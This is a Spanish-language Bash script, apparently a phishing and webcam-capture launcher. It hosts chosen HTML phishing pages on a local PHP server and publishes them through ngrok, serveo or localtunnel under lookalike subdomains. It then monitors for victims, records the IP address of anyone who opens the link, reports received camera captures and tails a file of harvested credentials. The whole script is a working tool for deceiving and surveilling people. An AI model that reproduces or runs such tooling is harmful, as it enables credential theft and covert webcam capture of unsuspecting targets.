#!/bin/bash
clear
# detect ctrl+c exiting
trap 'printf "\n";stop;exit 1' 2
ex() {
clear
echo -e "[*] (Tecla X = x ) Detectado, Saliendo... " | lolcat
sleep 2
echo -e "[*] Deteniendo el Servicio... " | lolcat
sleep 2
echo -e "[*] Deteniendo Herramientas... " | lolcat
sleep 2
echo -e "[*] Deteniendo Procesadores... " | lolcat
sleep 1
echo " "
echo -e "$grn
____  _  _  ____    ____  _  _  ___
(  _ \( \/ )( ___)  (  _ \( \/ )( ___)
 ) _ < \  /  )__)    ) _ < \  /  )__)
(____/ (__) (____)  (____/ (__) (____)..."| lolcat
echo " "
echo " "
sleep 2
echo '
 ----------------------------------
| NOS DA PENA QUE NOS DEJE CUIDASE |     
 ---------------------------------- 
 '| lolcat -a -d 20
echo && sleep 5
exit
}

color(){
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
orange='\033[40m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
Gris='\033[0;37m'
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Er5scape}[36m";
Reset="${Escape}[0m";
pe='\033[0;35m'
#-----------------
}
stop() {

printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
printf "${Green}[${BRed}X${Green}]${BGreen} Exit\n"
read -p "Option: " guard

if [[ $guard == R || $guard == r ]]; then
sleep 1
killall -2 php > /dev/null 2>&1
killall -2 lt > /dev/null 2>&1
killall -2 xterm > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
sleep 0.5
./retornal.sh

elif [[ $guard == X || $guard == x ]]; then
sleep 2
exit
else
exit
fi

}
stop() {

printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
printf "${Green}[${BRed}X${Green}]${BGreen} Exit\n"
read -p "Option: " guard

if [[ $guard == R || $guard == r ]]; then
sleep 1
killall -2 php > /dev/null 2>&1
killall -2 lt > /dev/null 2>&1
killall -2 xterm > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
sleep 0.5
./retornal.sh

elif [[ $guard == X || $guard == x ]]; then
sleep 2
ex

else
ex
fi

}
Iniciar(){
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' $my_va3/$my_va1.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
orange='\033[40m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
Gris='\033[0;37m'
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Er5scape}[36m";
Reset="${Escape}[0m";
pe='\033[0;35m'
negro="\e[1;30m"
azul="\e[1;34m"
verde="\e[1;32m"
cian="\e[1;36m"
rojo="\e[1;31m"
purpura="\e[1;35m"
amarillo="\e[1;33m"
blanco="\e[1;37m"
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
echo '	
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
┃ ╔███╗  ╔███╗ ╔█████╗ ╔██████╗  ╔███████╗     ┃
┃ ║██║║██║║██║ ██╔══██╗║██║  ║██ ║██╔════      ┃
┃ ║██║║██║║██║ ███████║║██║  ║██ ║███████║     ┃ 
┃ ║██║╚══╝║██║ ██╔══██║║██║  ║██ ║██╔════      ┃
┃ ║██║    ║██║ ██║  ██║║██████║  ║███████║     ┃
┃ ╚══╝    ╚══╝ ╚═╝  ╚═╝╚══════╝  ╚═══════╝V2.3 ┃
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
'| lolcat -a -d 4
echo -e -n "${verde}
        ┌═══════════════┐
        █${blanco}  AUTOR LUIGUI${verde} █
        └═══════════════┘
"${blanco}
color 
echo -e -n "${yellow}
╔━━━━━━━━━━━━━━━━━━━━━━━━━╗    ╔━━━━━━━━━━━━━━━━━━━━━━━━╗${yellow}
┃ $grn [1] $blanco Tunnel            ${yellow}┃    ┃ $grn [2] $blanco Ngrok            ${yellow}┃
╔━━━━━━━━━━━━━━━━━━━━━━━━━╗    ╔━━━━━━━━━━━━━━━━━━━━━━━━╗${yellow}   
┃ $grn [3] $blanco Localhost         ${yellow}┃    ┃ $grn [4] $blanco Volver al Inicio ${yellow}┃
╚━━━━━━━━━━━━━━━━━━━━━━━━━╝    ╚━━━━━━━━━━━━━━━━━━━━━━━━╝${yellow}
"${blanco}  
default_option_server="1"
echo -e -n "${rojo}
     ┌═══════════════┐
     █${blanco}Ingresa opcion${rojo} █
     └═══════════════┘
"${blanco}
read -p $'\e[1;31m     └──╼\e[0m\e[1;92m '  option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m" 
read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var33
site="$my_var33"
server2 
elif [[ $option_server -eq 2 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa carpeta:\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_va3
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la pagina:\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_va1
ngrok_server
elif [[ $option_server -eq 4 ]]; then
./retornal.sh
clear
elif [[ $option_server -eq 3 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m"
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_va2 
localhost
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}
server2() {
if [[ -e $site/ip.txt ]]; then
rm -rf $site/ip.txt

fi
if [[ -e $site/usernames.txt ]]; then
rm -rf $site/usernames.txt

fi

printf "${Yellow}Starting ${BGreen}PHP ${Green}server\n"
cd $site && xterm -geometry 90x26+1000 -hold -T "PHP server" -e "php -S 127.0.0.1:443" > /dev/null 2>&1 &
sleep 5
printf "${BGreen}OK.${clear}\n"
printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
xterm -hold -geometry 90x26+1000+1000 -T "LocalTunnel server" -e "lt --port 443 --subdomain wmw-$site-com" > /dev/null 2>&1 &
sleep 10
printf "${BGreen}OK.${clear}\n\n"
printf "${BYellow}Your URL name is: ${BGreen}https://wmw-$site-com.loca.lt\n"
printf "\n"
sleep 2
printf "Website: $site \n\n" > credentials.txt
xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f credentials.txt' > /dev/null 2>&1 &
sleep 1

checkfound
#===============================================
}

localhost(){
cd $my_va2
php -S localhost:8080
}

payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' $my_va1 > index2.html

}

start() {

default_choose_sub="Y"
default_subdomain="grabcam$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}
dependencies
start1
}
Iniciar
color
